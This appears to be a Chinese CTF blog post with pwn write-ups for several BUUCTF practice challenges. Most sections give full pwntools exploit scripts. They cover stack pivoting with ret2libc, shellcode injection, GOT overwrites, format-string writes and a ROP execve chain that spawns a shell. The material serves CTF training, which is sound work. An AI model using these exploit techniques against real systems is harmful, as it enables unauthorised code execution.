<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h2><h3 id="常用文件描述符"><a href="#常用文件描述符" class="headerlink" title="常用文件描述符"></a>常用文件描述符</h3><ul>
<li>stdin：0</li>
<li>stdout：1</li>
<li>stderr：2</li>
</ul>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>关闭了输出流和错误流，然后直接给了shell，但是没有输出。</p>
</blockquote>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210430210044168.png" alt="image-20210430210044168"></p>
<p>方法：</p>
<h3 id="stdout重定向"><a href="#stdout重定向" class="headerlink" title="stdout重定向"></a>stdout重定向</h3><p>简单来说，既然stdout的文件描述符不可用，可以对stdout重定向，将文件描述符 stdout（1）重定向到可用文件描述符 stdin（0）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;0</span><br></pre></td></tr></table></figure>



<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec ACTF_2019_babystack</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;ACTF_2019_babystack&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>



<h2 id="actf-2019-babystack-1"><a href="#actf-2019-babystack-1" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><blockquote>
<p><del>吐了，，，思路一样，不对</del></p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>最多可以输入0xe0个字节，但是s在rbp-0xd0。</p>
<p>故最多可以溢出rbp和返回地址，所以需要栈迁移。</p>
<p>程序给了栈地址，直接在栈上布置即可。</p>
<ul>
<li><p>rbp：fake stack</p>
</li>
<li><p>ret：leave_ret</p>
</li>
</ul>
</blockquote>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501162717088.png" alt="image-20210501162717088"></p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><blockquote>
<p>自己不知道哪里错了，，，直接用师傅的<a href="https://www.cnblogs.com/luoleqi/p/13409781.html" target="_blank" rel="noopener">exp</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29408</span>)</span><br><span class="line"><span class="comment">#io = process('./ACTF_2019_babystack')</span></span><br><span class="line"><span class="comment">#io = process('./idaidg/linux_server64')</span></span><br><span class="line">elf = ELF(<span class="string">'./ACTF_2019_babystack'</span>)</span><br><span class="line"> </span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"> </span><br><span class="line">pop_rdi = <span class="number">0x400ad3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">start = <span class="number">0x4008f6</span></span><br><span class="line">leave = <span class="number">0x400a18</span></span><br><span class="line">ret = <span class="number">0x400a4f</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"How many bytes of your message?"</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"Your message will be saved at "</span>)</span><br><span class="line">addr = io.recv()[:<span class="number">14</span>]</span><br><span class="line">addr = int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u64(puts_addr))</span><br><span class="line">libcbase = u64(puts_addr) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"How many bytes of your message?"</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Your message will be saved at "</span>)</span><br><span class="line">addr = io.recv()[:<span class="number">14</span>]</span><br><span class="line">addr = int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h2><blockquote>
<p>最简单的ret2shellcode题，把shellcode发过去就行。。。</p>
</blockquote>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>唯一的难点应该在于main函数不能反汇编，得看汇编。</p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501164740595.png" alt="image-20210501164740595"></p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501164752604.png" alt="image-20210501164752604"></p>
<p>vuln函数就是输入再打印。</p>
<p>所以，程序流程就是输入数据，并且会直接改数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29061</span>)</span><br><span class="line">elf = ELF(<span class="string">'./PicoCTF_2018_shellcode'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><h3 id="程序流程-2"><a href="#程序流程-2" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>能给任意地址写入四个字节数据，32位。</p>
<p>而且给了后门函数，直接修改puts的got表位win的地址即可。</p>
<p>注意一点：发送数据应该发送的是整数，也就是hex()，而不是p32()，它是字符。</p>
</blockquote>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419145953699.png" alt="image-20210419145953699"></p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419150030225.png" alt="image-20210419150030225"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25946</span>)</span><br><span class="line">elf = ELF(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">win = elf.symbols[<span class="string">'win'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value?"</span>)</span><br><span class="line">p.sendline(hex(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"like"</span>)</span><br><span class="line">p.sendline(hex(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><blockquote>
<p>一道格式化字符串，，，，不知道为什么用pwntools工具不好使，，，</p>
</blockquote>
<h3 id="程序流程-3"><a href="#程序流程-3" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501231211604.png" alt="image-20210501231211604"></p>
<p>输入字符串，格式化字符串</p>
<p>一个判断，满足判断即可获得shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> judge <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">	<span class="keyword">if</span>( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span>):</span><br><span class="line">		<span class="keyword">print</span> judge</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ python equation.py </span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>故只要judge为2即可。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用格式化字符串将judge的值变为2即可。</p>
<p>方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;bb%9$naaa&quot;+p64(judge)</span><br></pre></td></tr></table></figure>

<h4 id="8不是9"><a href="#8不是9" class="headerlink" title="8不是9"></a>8不是9</h4><p>8</p>
<blockquote>
<p>只发送了0xf个字节，到1的时候就没了，，，后门的并没有发送过去。。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;bb%8$n&quot;+p64(judge)	&#x3D;&gt;	将%8$n之前的字节数，也就是2，写入到offse&#x3D;8的位置，也就是%8$n后面的judge</span><br><span class="line"></span><br><span class="line">[DEBUG] Sent 0xf bytes:</span><br><span class="line">    00000000  62 62 25 38  24 6e 5c 10  60 00 00 00  00 00 0a     │bb%8│$n\·│&#96;···│···│</span><br><span class="line">    0000000f</span><br></pre></td></tr></table></figure>

<p>9</p>
<blockquote>
<p>发送了12个字节，都发送过去了。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;bb%9$naaa&quot;+p64(judge)	&#x3D;&gt;	将%9$n之前的字节数，也就是2，写入到offse&#x3D;9的位置，因为偏移为8，而judge前面刚好9个字节，一开始就少一个，所以offset&#x3D;9的位置刚好在前面九个字符之后。</span><br><span class="line"></span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    00000000  62 62 25 39  24 6e 61 61  61 5c 10 60  00 00 00 00  │bb%9│$naa│a\·&#96;│····│</span><br><span class="line">    00000010  00 0a</span><br></pre></td></tr></table></figure>

<p>emmm，字节对齐？</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for judge in range(200):</span></span><br><span class="line"><span class="comment"># 	if( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198):</span></span><br><span class="line"><span class="comment"># 		print judge</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./wdb_2018_2nd_easyfmt")</span></span><br><span class="line">p=process(<span class="string">"./mrctf2020_easy_equation"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28245</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">judge = <span class="number">0x60105C</span></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(offset,&#123;judge:2&#125;)</span></span><br><span class="line">payload = <span class="string">"bb%9$naaa"</span>+p64(judge)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><blockquote>
<p>静态文件，用ropchain就行，类似于<a href="https://blog.csdn.net/qq_43935969/article/details/104444648?spm=1001.2014.3001.5501" target="_blank" rel="noopener">这道题</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file PicoCTF_2018_can-you-gets-me </span><br><span class="line">PicoCTF_2018_can-you-gets-me: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU&#x2F;Linux), statically linked, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped</span><br><span class="line"></span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec PicoCTF_2018_can-you-gets-me</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;PicoCTF_2018_can-you-gets-me&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506151027760.png" alt="image-20210506151027760"></p>
<p>栈溢出，18个字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary PicoCTF_2018_can-you-gets-me --ropchain</span><br></pre></td></tr></table></figure>

<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./PicoCTF_2018_can-you-gets-me")</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26005</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x18</span> + <span class="number">4</span>)+p</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><blockquote>
<p>格式化字符串</p>
</blockquote>
<h3 id="程序流程-4"><a href="#程序流程-4" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>有一个循环，格式化字符串漏洞，多次利用</p>
<p>程序中调用了system函数</p>
</blockquote>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506152600364.png" alt="image-20210506152600364"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>利用格式化字符串修改printf的got为system函数的plt表</li>
<li>发送‘/bin/sh’即可。</li>
</ol>
<h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./echo"</span>)</span><br><span class="line"><span class="comment"># p=process(['./wdb_2018_2nd_easyfmt'],env=&#123;"LD_PRELOAD":"/home/winter/buu/libc-2.23-32.so"&#125;)</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26073</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">elf = ELF(<span class="string">"./echo"</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">system_got = elf.got[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a>suctf_2018_basic pwn</h2><blockquote>
<p>最简单的栈溢出</p>
</blockquote>
<p>偏移量为0x110</p>
<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506154310332.png" alt="image-20210506154310332"></p>
